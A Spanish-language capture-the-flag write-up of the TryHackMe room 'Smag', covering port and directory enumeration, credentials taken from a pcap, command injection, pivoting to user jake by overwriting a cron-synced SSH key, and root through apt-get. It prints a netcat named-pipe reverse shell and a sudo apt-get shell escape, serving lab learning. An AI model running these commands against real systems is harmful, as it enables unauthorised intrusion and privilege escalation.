Bienvenidos a otra sala de tryhackme. Realizamos nuestro escaneo de puertos abiertos, enumeramos directorios ocultos y secuestramos un archivo .pcap para iniciar nuestro proceso de intrusion y haciendo pivoting entre usuarios hasta llegar al usuario raiz root abusandonos de `apt-get`

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.25s latency).
Scanned at 2023-07-05 01:00:30 EDT for 23s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra los puertos ssh y http abiertos. Al navegar al sitio web no encontramos mucho por ver. Iniciamos busqueda de directorios ocultos con Gobuster.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlists -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/05 01:03:42 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/mail (Status: 301)
/server-status (Status: 403)
=====================================================
2023/07/05 01:04:41 Finished

```

Descubrimos el direcotiro /mail que al navegar en el habra un archivo .pcap que al investigarlo podemos encontrar un paquete de logeo http en el que secuestramos sus credenciales y lo dirigimos a la URL donde se ingreso.
Para hacer esto, agregamos la URL a /etc/hosts de nuestra maquina atacante con su IP correspondiente

```bash
sudo nano /etc/hosts

IPTARGET development.smag.thm
```

# Intrusion

Iniciamos sesion en /login.php de la web obtenida anteriormente, y entramos con las credenciales que secuestramos investigando el archivo .pcap. Nos dirigira a /admin.php donde nos solicita que ejecutemos un comando. 

En nuestra maquina atacante, atraparemos trafico IMCP y nos autolanzamos un PING para ver si funciona y poder realizar una reverse shell del sistema.

```bash
 # En nuestra maquina atacante
sudo tcpdump -i tun0 icmp -n -v

 # En el navegador web
ping LHOST -c 10

 # Resultado tcpdump
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:21:31.548771 IP (tos 0x0, ttl 63, id 48715, offset 0, flags [DF], proto ICMP (1), length 84)
    IPTARGET > LHOST: ICMP echo request, id 851, seq 5, length 64
01:21:31.548787 IP (tos 0x0, ttl 64, id 6874, offset 0, flags [none], proto ICMP (1), length 84)
    LHOST > IPTARGET: ICMP echo reply, id 851, seq 5, length 64
01:21:32.549788 IP (tos 0x0, ttl 63, id 48869, offset 0, flags [DF], proto ICMP (1), length 84)
    IPTARGET > LHOST: ICMP echo request, id 851, seq 6, length 64
01:21:32.549815 IP (tos 0x0, ttl 64, id 6921, offset 0, flags [none], proto ICMP (1), length 84)
    LHOST > IPTARGET: ICMP echo reply, id 851, seq 6, length 64
01:21:33.550906 IP (tos 0x0, ttl 63, id 48970, offset 0, flags [DF], proto ICMP (1), length 84)
    IPTARGET > LHOST: ICMP echo request, id 851, seq 7, length 64
01:21:33.550926 IP (tos 0x0, ttl 64, id 7042, offset 0, flags [none], proto ICMP (1), length 84)
    LHOST > IPTARGET: ICMP echo reply, id 851, seq 7, length 64
01:21:34.551937 IP (tos 0x0, ttl 63, id 49076, offset 0, flags [DF], proto ICMP (1), length 84)
    IPTARGET > LHOST: ICMP echo request, id 851, seq 8, length 64
01:21:34.551956 IP (tos 0x0, ttl 64, id 7139, offset 0, flags [none], proto ICMP (1), length 84)
    LHOST > IPTARGET: ICMP echo reply, id 851, seq 8, length 64

```

Podemos ver que si funciono. Ahora nos pondemos en escucha en nuestra maquina atacante y ejecutamos una reverse shell en el servidor web.

```bash
 # Maquina atacante
nc -nvlp LPORT

 # Servidor Web
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 'LHOST' 'LPORT' >/tmp/f
```

# Priv.Escalation

Dentro del sistema, enumeramos las tareas cron `cat /etc/crontab` y hay una tarea programada en la ruta /opt/.backups con la id_rsa.pub del usuario jake.

Para realizar este proceso, primero nos generamos una clave id_rsa nueva en nuestra maquina atancate sin necesidad de poner una password. Luego, copiamos nuestro id_rsa.pub que acabamos de generar y lo pegamos dentro del sistema donde esta alojado el id_rsa.pub de jake de la siguiente manera:

```bash
 # En nuestra maquina atacante

ssh-keygen

Enter file in which to save the key (/home/ggh/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 

 # Copiamos el contenido del archivo id_rsa.pub que nos acaba de generar y lo sobreescribimos en el id_rsa.pub de jake.

echo "Content-Id_rsa.pub(Atacante)" > jake_id_rsa.pub.backup
```

Ahora establecemos una conexion ssh como usuario jake. Modificamos los permisos de nuestra id_rsa a 600 con chmod.

```bash
chmod 600 id_rsa
ssh -i id_rsa jake@IPTARGET
```

Ya accedimos como usuario jake, ahora listamos los permisos de superusuario con `sudo -l`. Tiene permisos en **apt-get** en el que ejecutamos el siguiente comando y nos dara una shell con privilegios elevados de usuario raiz root.

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

Informacion sacada de https://gtfobins.github.io/gtfobins/apt-get/